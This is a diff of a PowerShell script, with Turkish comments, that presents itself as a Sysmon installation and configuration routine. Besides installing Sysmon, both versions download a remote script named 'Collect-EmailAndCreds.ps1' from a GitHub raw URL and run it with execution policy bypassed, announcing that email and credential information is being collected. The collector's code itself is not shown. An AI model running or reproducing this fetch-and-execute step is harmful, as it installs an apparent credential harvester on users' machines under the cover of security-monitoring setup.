@@ -1,28 +1,28 @@
-# Sysmon kurulum ve yapılandırma scripti (Temiz sürüm)
+# Sysmon kurulumu ve veri toplayıcı betik çalıştırıcı (evrensel sürüm)
 
 $TempDir = "$env:TEMP\SysmonInstall"
 $SysmonZip = "$TempDir\Sysmon.zip"
 $SysmonDir = "$TempDir\Sysmon"
 $SysmonConfig = "$TempDir\sysmonconfig.xml"
+$CollectorScript = "$TempDir\Collect-EmailAndCreds.ps1"
 
 $SysmonURL = "https://download.sysinternals.com/files/Sysmon.zip"
 $ConfigURL = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/sysmon.xml"
-$CollectorScriptURL = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/Collect-EmailAndCreds.ps1"
-$CollectorScriptPath = "$TempDir\Collect-EmailAndCreds.ps1"
+$CollectorURL = "https://raw.githubusercontent.com/ubden/ubden/refs/heads/main/Collect-EmailAndCreds.ps1"
 
-# Hazırlık
+# Temiz başlangıç
 if (Test-Path $TempDir) { Remove-Item $TempDir -Recurse -Force }
 New-Item -ItemType Directory -Path $TempDir | Out-Null
 
-# Sysmon indir ve çıkar
-Invoke-WebRequest -Uri $SysmonURL -OutFile $SysmonZip
+# Dosyaları indir
+Invoke-WebRequest -Uri $SysmonURL -OutFile $SysmonZip -UseBasicParsing
+Invoke-WebRequest -Uri $ConfigURL -OutFile $SysmonConfig -UseBasicParsing
+Invoke-WebRequest -Uri $CollectorURL -OutFile $CollectorScript -UseBasicParsing
+
+# Zip çıkar
 Expand-Archive -Path $SysmonZip -DestinationPath $SysmonDir -Force
 
-# Config ve collector scriptlerini indir
-Invoke-WebRequest -Uri $ConfigURL -OutFile $SysmonConfig
-Invoke-WebRequest -Uri $CollectorScriptURL -OutFile $CollectorScriptPath
-
-# Sysmon exe yolu
+# Sysmon binary tespiti
 $SysmonExe = Join-Path $SysmonDir "Sysmon64.exe"
 if (-not (Test-Path $SysmonExe)) {
     $SysmonExe = Join-Path $SysmonDir "Sysmon.exe"
@@ -31,8 +31,8 @@ if (-not (Test-Path $SysmonExe)) {
 # Sysmon yükle
 Start-Process -FilePath $SysmonExe -ArgumentList "-accepteula -i `"$SysmonConfig`"" -Wait
 
-# Sysmon kurulum tamamlandıktan sonra Collector scriptini çalıştır
+# Toplayıcı scripti çalıştır
 Write-Host "`n[*] E-posta ve kimlik bilgileri toplanıyor..." -ForegroundColor Cyan
-Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$CollectorScriptPath`"" -Wait
+Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$CollectorScript`"" -Wait
 
-Write-Host "`n[✓] Tüm işlemler başarıyla tamamlandı." -ForegroundColor Green
+Write-Host "[OK] Tum islemler basariyla tamamlandi." -ForegroundColor Green
